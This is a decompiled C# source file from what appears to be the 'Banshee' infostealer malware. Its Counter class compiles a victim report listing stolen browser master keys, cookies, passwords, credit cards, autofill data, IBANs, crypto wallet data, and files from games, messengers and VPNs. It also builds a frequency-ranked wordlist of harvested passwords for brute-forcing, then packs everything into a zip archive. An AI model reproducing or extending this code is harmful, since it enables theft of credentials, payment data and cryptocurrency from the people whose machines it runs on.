﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using Banshee.Helper.Encrypted;

namespace Banshee.Helper.Data
{
	// Token: 0x020000F2 RID: 242
	public class Counter
	{
		// Token: 0x06000334 RID: 820 RVA: 0x00019558 File Offset: 0x00019558
		public void AddBrutePassword(string password)
		{
			if (string.IsNullOrWhiteSpace(password))
			{
				return;
			}
			string key = password.Trim();
			Interlocked.Increment(ref this._brutePasswordStats.GetOrAdd(key, delegate(string _)
			{
				long firstIndex = Interlocked.Increment(ref this._brutePasswordSequence);
				return new Counter.BrutePasswordStat
				{
					FirstIndex = firstIndex
				};
			}).Count);
		}

		// Token: 0x06000335 RID: 821 RVA: 0x00019598 File Offset: 0x00019598
		public void TrackPasswordDomain(string origin)
		{
			this._domainDetector.TrackPassword(origin);
		}

		// Token: 0x06000336 RID: 822 RVA: 0x000195A6 File Offset: 0x000195A6
		public void TrackCookieDomain(string host, string path)
		{
			this._domainDetector.TrackCookie(host, path);
		}

		// Token: 0x06000337 RID: 823 RVA: 0x000195B8 File Offset: 0x000195B8
		public void Collect(InMemoryZip zip)
		{
			List<string> list = new List<string>();
			List<string[]> masterKeys = LocalState.GetMasterKeys();
			if (masterKeys.Count<string[]>() > 0)
			{
				list.Add(string.Format("[Keys]  [--{0}--]  [{1}]", masterKeys.Count<string[]>(), string.Join(", ", (from k in masterKeys
				select Paths.GetBrowserName(k[0])).Distinct<string>())));
				foreach (string[] array in masterKeys)
				{
					list.Add(string.Concat(new string[]
					{
						"       [",
						Paths.GetBrowserName(array[0]),
						" ",
						array[1],
						"] ",
						array[2]
					}));
				}
				list.Add("");
			}
			if (this.Browsers.Count<Counter.CounterBrowser>() > 0)
			{
				list.Add(string.Format("[Browsers]  [--{0}--]  [{1}]", this.Browsers.Count<Counter.CounterBrowser>(), string.Join(", ", (from b in this.Browsers
				select b.BrowserName).ToArray<string>())));
				foreach (Counter.CounterBrowser counterBrowser in this.Browsers)
				{
					list.Add("  - " + counterBrowser.Profile);
					if (counterBrowser.Cookies != 0L)
					{
						list.Add(string.Format("       [Cookies {0}]", counterBrowser.Cookies));
					}
					if (counterBrowser.Password != 0L)
					{
						list.Add(string.Format("       [Passwords {0}]", counterBrowser.Password));
					}
					if (counterBrowser.CreditCards != 0L)
					{
						list.Add(string.Format("       [CreditCards {0}]", counterBrowser.CreditCards));
					}
					if (counterBrowser.AutoFill != 0L)
					{
						list.Add(string.Format("       [AutoFill {0}]", counterBrowser.AutoFill));
					}
					if (counterBrowser.RestoreToken != 0L)
					{
						list.Add(string.Format("       [RestoreToken {0}]", counterBrowser.RestoreToken));
					}
					if (counterBrowser.MaskCreditCard != 0L)
					{
						list.Add(string.Format("       [MaskCreditCard {0}]", counterBrowser.MaskCreditCard));
					}
					if (counterBrowser.MaskedIban != 0L)
					{
						list.Add(string.Format("       [MaskedIban {0}]", counterBrowser.MaskedIban));
					}
					list.Add("");
				}
				list.Add("");
			}
			if (this.Applications.Count<Counter.CounterApplications>() > 0)
			{
				list.Add(string.Format("[Applications]  [--{0}--]  [{1}]", this.Applications.Count<Counter.CounterApplications>(), string.Join(", ", (from b in this.Applications
				select b.Name).ToArray<string>())));
				foreach (Counter.CounterApplications counterApplications in this.Applications)
				{
					list.Add("     [Name " + counterApplications.Name + "]");
					foreach (string str in counterApplications.Files.Reverse<string>())
					{
						list.Add("       - " + str);
					}
					list.Add("");
				}
				list.Add("");
			}
			if (this.Games.Count<Counter.CounterApplications>() > 0)
			{
				list.Add(string.Format("[Games]  [--{0}--]  [{1}]", this.Games.Count<Counter.CounterApplications>(), string.Join(", ", (from b in this.Games
				select b.Name).ToArray<string>())));
				foreach (Counter.CounterApplications counterApplications2 in this.Games)
				{
					list.Add("     [Name " + counterApplications2.Name + "]");
					foreach (string str2 in counterApplications2.Files.Reverse<string>())
					{
						list.Add("       - " + str2);
					}
					list.Add("");
				}
				list.Add("");
			}
			if (this.Messangers.Count<Counter.CounterApplications>() > 0)
			{
				list.Add(string.Format("[Messangers]  [--{0}--]  [{1}]", this.Messangers.Count<Counter.CounterApplications>(), string.Join(", ", (from b in this.Messangers
				select b.Name).ToArray<string>())));
				foreach (Counter.CounterApplications counterApplications3 in this.Messangers)
				{
					list.Add("     [Name " + counterApplications3.Name + "]");
					foreach (string str3 in counterApplications3.Files.Reverse<string>())
					{
						list.Add("       - " + str3);
					}
					list.Add("");
				}
				list.Add("");
			}
			if (this.Vpns.Count<Counter.CounterApplications>() > 0)
			{
				list.Add(string.Format("[Vpns]  [--{0}--]  [{1}]", this.Vpns.Count<Counter.CounterApplications>(), string.Join(", ", (from b in this.Vpns
				select b.Name).ToArray<string>())));
				foreach (Counter.CounterApplications counterApplications4 in this.Vpns)
				{
					list.Add("     [Name " + counterApplications4.Name + "]");
					foreach (string str4 in counterApplications4.Files.Reverse<string>())
					{
						list.Add("       - " + str4);
					}
					list.Add("");
				}
				list.Add("");
			}
			if (this.CryptoChromium.Count<string>() > 0)
			{
				list.Add(string.Format("[CryptoChromium]  [--{0}--]", this.CryptoChromium.Count<string>()));
				foreach (string str5 in this.CryptoChromium)
				{
					list.Add("  - " + str5);
				}
				list.Add("");
			}
			if (this.CryptoDesktop.Count<string>() > 0)
			{
				list.Add(string.Format("[CryptoDesktop]  [--{0}--]", this.CryptoDesktop.Count<string>()));
				foreach (string str6 in this.CryptoDesktop)
				{
					list.Add("  - " + str6);
				}
				list.Add("");
			}
			if (this.FilesGrabber.Count<string>() > 0)
			{
				list.Add(string.Format("[FilesGrabber]  [--{0}--]", this.FilesGrabber.Count<string>()));
				foreach (string str7 in this.FilesGrabber)
				{
					list.Add("  - " + str7);
				}
				list.Add("");
			}
			zip.AddTextFile("Banshed.txt", string.Join("\n", list));
			string text = this._domainDetector.BuildReport();
			if (!string.IsNullOrEmpty(text))
			{
				zip.AddTextFile("DomainDetect.txt", text);
			}
			if (!this._brutePasswordStats.IsEmpty)
			{
				List<string> values = (from p in this._brutePasswordStats
				select new
				{
					Password = p.Key,
					Count = p.Value.Count,
					FirstIndex = p.Value.FirstIndex
				} into p
				orderby p.Count descending, p.FirstIndex
				select p.Password).ToList<string>();
				zip.AddTextFile("Brute.txt", string.Join(Environment.NewLine, values));
			}
		}

		// Token: 0x04000266 RID: 614
		public ConcurrentBag<string> FilesGrabber = new ConcurrentBag<string>();

		// Token: 0x04000267 RID: 615
		public ConcurrentBag<string> CryptoDesktop = new ConcurrentBag<string>();

		// Token: 0x04000268 RID: 616
		public ConcurrentBag<string> CryptoChromium = new ConcurrentBag<string>();

		// Token: 0x04000269 RID: 617
		private readonly ConcurrentDictionary<string, Counter.BrutePasswordStat> _brutePasswordStats = new ConcurrentDictionary<string, Counter.BrutePasswordStat>(StringComparer.Ordinal);

		// Token: 0x0400026A RID: 618
		private long _brutePasswordSequence;

		// Token: 0x0400026B RID: 619
		private readonly DomainDetector _domainDetector = new DomainDetector();

		// Token: 0x0400026C RID: 620
		public ConcurrentBag<Counter.CounterBrowser> Browsers = new ConcurrentBag<Counter.CounterBrowser>();

		// Token: 0x0400026D RID: 621
		public ConcurrentBag<Counter.CounterApplications> Applications = new ConcurrentBag<Counter.CounterApplications>();

		// Token: 0x0400026E RID: 622
		public ConcurrentBag<Counter.CounterApplications> Vpns = new ConcurrentBag<Counter.CounterApplications>();

		// Token: 0x0400026F RID: 623
		public ConcurrentBag<Counter.CounterApplications> Games = new ConcurrentBag<Counter.CounterApplications>();

		// Token: 0x04000270 RID: 624
		public ConcurrentBag<Counter.CounterApplications> Messangers = new ConcurrentBag<Counter.CounterApplications>();

		// Token: 0x020000F3 RID: 243
		public class CounterBrowser
		{
			// Token: 0x04000271 RID: 625
			public string Profile;

			// Token: 0x04000272 RID: 626
			public string BrowserName;

			// Token: 0x04000273 RID: 627
			public ConcurrentLong Cookies;

			// Token: 0x04000274 RID: 628
			public ConcurrentLong Password;

			// Token: 0x04000275 RID: 629
			public ConcurrentLong CreditCards;

			// Token: 0x04000276 RID: 630
			public ConcurrentLong AutoFill;

			// Token: 0x04000277 RID: 631
			public ConcurrentLong RestoreToken;

			// Token: 0x04000278 RID: 632
			public ConcurrentLong MaskCreditCard;

			// Token: 0x04000279 RID: 633
			public ConcurrentLong MaskedIban;
		}

		// Token: 0x020000F4 RID: 244
		public class CounterApplications
		{
			// Token: 0x0400027A RID: 634
			public string Name;

			// Token: 0x0400027B RID: 635
			public ConcurrentBag<string> Files = new ConcurrentBag<string>();
		}

		// Token: 0x020000F5 RID: 245
		private sealed class BrutePasswordStat
		{
			// Token: 0x0400027C RID: 636
			public int Count;

			// Token: 0x0400027D RID: 637
			public long FirstIndex;
		}
	}
}
